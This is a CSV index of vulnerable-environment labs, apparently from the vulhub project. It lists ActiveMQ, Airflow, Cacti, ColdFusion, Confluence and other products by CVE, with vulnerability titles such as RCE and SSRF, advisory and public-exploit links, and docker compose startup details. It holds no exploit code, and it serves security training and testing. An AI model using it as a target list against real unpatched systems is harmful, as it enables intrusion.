Name,CVE,Description,References,Path,Type,Startup,Vector
activemq,CVE-2022-41678,Apache ActiveMQ Jolokia Authenticated Remote Code Execution (CVE-2022-41678),"https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt
https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/
http://localhost
http://your-ip:8161
http://localhost:8161",https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2022-41678,docker-compose,docker compose up,remote
activemq,CVE-2016-3088,ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088),,https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2016-3088,docker-compose,docker compose up,remote
activemq,CVE-2023-46604,Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604),"https://activemq.apache.org/news/cve-2023-46604
https://xz.aliyun.com/t/12929
https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/
https://forum.butian.net/share/2566
http://ip",https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2023-46604,docker-compose,docker compose up,remote
activemq,CVE-2015-5254,ActiveMQ Deserialization Vulnerability (CVE-2015-5254),https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf,https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2015-5254,docker-compose,docker compose up,remote
adminer,CVE-2021-21311,Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311),"https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6
https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml",https://github.com/vulhub/vulhub/tree/master/adminer/CVE-2021-21311,docker-compose,docker compose up,remote
adminer,CVE-2021-43008,Adminer Remote Arbitrary File Read (CVE-2021-43008),"https://github.com/p0dalirius/CVE-2021-43008-AdminerRead
http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability",https://github.com/vulhub/vulhub/tree/master/adminer/CVE-2021-43008,docker-compose,docker compose up,remote
airflow,CVE-2020-17526,Apache Airflow Authentication Bypass (CVE-2020-17526),"https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0
https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise
http://localhost:8080/admin/airflow/login",https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-17526,docker-compose,docker compose up,remote
airflow,CVE-2020-11981,Apache Airflow Celery Broker Remote Command Execution (CVE-2020-11981),"https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
https://github.com/apache/airflow/pull/9178",https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11981,docker-compose,docker compose up,remote
airflow,CVE-2020-11978,Apache Airflow Command Injection in Example Dag (CVE-2020-11978),"https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
https://github.com/pberba/CVE-2020-11978",https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11978,docker-compose,docker compose up,remote
aj-report,Unknown,AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077),"https://xz.aliyun.com/t/14460
https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md",unknown,docker-compose,docker compose up,remote
apache-cxf,CVE-2024-28752,Apache CXF Aegis DataBinding Server-Side Request Forgery (CVE-2024-28752),"https://github.com/advisories/GHSA-qmgx-j96g-4428
https://nvd.nist.gov/vuln/detail/CVE-2024-28752
https://github.com/ReaJason/CVE-2024-28752",https://github.com/vulhub/vulhub/tree/master/apache-cxf/CVE-2024-28752,docker-compose,docker compose up,remote
apache-druid,CVE-2021-25646,Apache Druid Embedded Javascript Remote Code Execution (CVE-2021-25646),"https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution
https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw",https://github.com/vulhub/vulhub/tree/master/apache-druid/CVE-2021-25646,docker-compose,docker compose up,remote
apereo-cas,Unknown,Apereo CAS 4.1 Deserialization RCE Vulnerability,"https://apereo.github.io/2016/04/08/commonsvulndisc/
http://your-ip:8080
http://your-ip:8080/cas/login",unknown,docker-compose,docker compose up,remote
apisix,CVE-2020-13945,Apache APISIX Hardcoded API Token Leads to RCE (CVE-2020-13945),"https://apisix.apache.org/docs/apisix/getting-started
https://github.com/apache/apisix/pull/2244
https://seclists.org/oss-sec/2020/q4/187",https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2020-13945,docker-compose,docker compose up,remote
apisix,CVE-2021-45232,Apache APISIX Dashboard Unauthenticated Access Leads to RCE (CVE-2021-45232),"https://apisix.apache.org/blog/2021/12/28/dashboard-cve-2021-45232/
https://github.com/wuppp/cve-2021-45232-exp",https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2021-45232,docker-compose,docker compose up,remote
appweb,CVE-2018-8715,AppWeb Authentication Bypass vulnerability (CVE-2018-8715),https://ssd-disclosure.com/index.php/archives/3676,https://github.com/vulhub/vulhub/tree/master/appweb/CVE-2018-8715,docker-compose,docker compose up,remote
aria2,Unknown,Aria2 Arbitrary File Write Vulnerability,"https://paper.seebug.org/120/
http://binux.github.io/yaaw/demo/
https://paper.seebug.org/120/",unknown,docker-compose,docker compose up,remote
bash,CVE-2014-6271,Bash Shellshock Remote Command Injection (CVE-2014-6271),,https://github.com/vulhub/vulhub/tree/master/bash/CVE-2014-6271,docker-compose,docker compose up,remote
cacti,CVE-2022-46169,Cacti remote_agent.php Pre-Auth Command Injection (CVE-2022-46169),"https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A",https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2022-46169,docker-compose,docker compose up,remote
cacti,CVE-2023-39361,Cacti graph_view.php SQL Injection Leads to RCE (CVE-2023-39361/CVE-2024-31459),"https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg
https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv",https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2023-39361,docker-compose,docker compose up,remote
cacti,CVE-2025-24367,Cacti RRDTool Post-Auth Argument Injection Leads to RCE (CVE-2025-24367),"https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq
https://github.com/Cacti/cacti/commit/c7e4ee798d263a3209ae6e7ba182c7b65284d8f0
http://your-ip:8080",https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2025-24367,docker-compose,docker compose up,remote
celery,Unknown,Celery <4.0 Redis unauthorized access + Pickle deserialization exploit,,unknown,docker-compose,docker compose up,remote
cgi,CVE-2016-5385,CGI Application Environment Variable Injection by HTTPoxy (CVE-2016-5385),"https://httpoxy.org
http://*.*.122.65:8888/`:",https://github.com/vulhub/vulhub/tree/master/cgi/CVE-2016-5385,docker-compose,docker compose up,remote
cmsms,CVE-2019-9053,CMS Made Simple (CMSMS) < 2.2.10 Unauthenticated SQL Injection (CVE-2019-9053),"https://www.exploit-db.com/exploits/46635
https://srcincite.io/pocs/cve-2021-26120.py.txt
https://www.exploit-db.com/exploits/46635
http://127.0.0.1",https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2019-9053,docker-compose,docker compose up,remote
cmsms,CVE-2021-26120,CMS Made Simple (CMSMS) Unauthenticated Remote Code Execution (CVE-2019-9053/CVE-2021-26120),"https://srcincite.io/pocs/cve-2021-26120.py.txt
https://www.exploit-db.com/exploits/46635
https://srcincite.io/pocs/cve-2021-26120.py.txt",https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2021-26120,docker-compose,docker compose up,remote
coldfusion,CVE-2023-29300,Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300),"https://blog.projectdiscovery.io/adobe-coldfusion-rce/
https://xz.aliyun.com/t/13413",https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2023-29300,docker-compose,docker compose up,remote
coldfusion,CVE-2023-26360,Adobe ColdFusion Local File Inclusion Leads to RCE (CVE-2023-26360),https://xz.aliyun.com/t/13392,https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2023-26360,docker-compose,docker compose up,remote
coldfusion,CVE-2017-3066,Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066),"https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html
https://www.exploit-db.com/exploits/43993
https://github.com/codewhitesec/ColdFusionPwn",https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2017-3066,docker-compose,docker compose up,remote
coldfusion,CVE-2010-2861,Adobe ColdFusion Directory Traversal Vulnerability (CVE-2010-2861),,https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2010-2861,docker-compose,docker compose up,remote
confluence,CVE-2019-3396,Atlassian Confluence Path Traversal Leads to RCE (CVE-2019-3396),"https://paper.seebug.org/884/
https://jira.atlassian.com/browse/CONFSERVER-57974
http://localhost:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396,docker-compose,docker compose up,remote
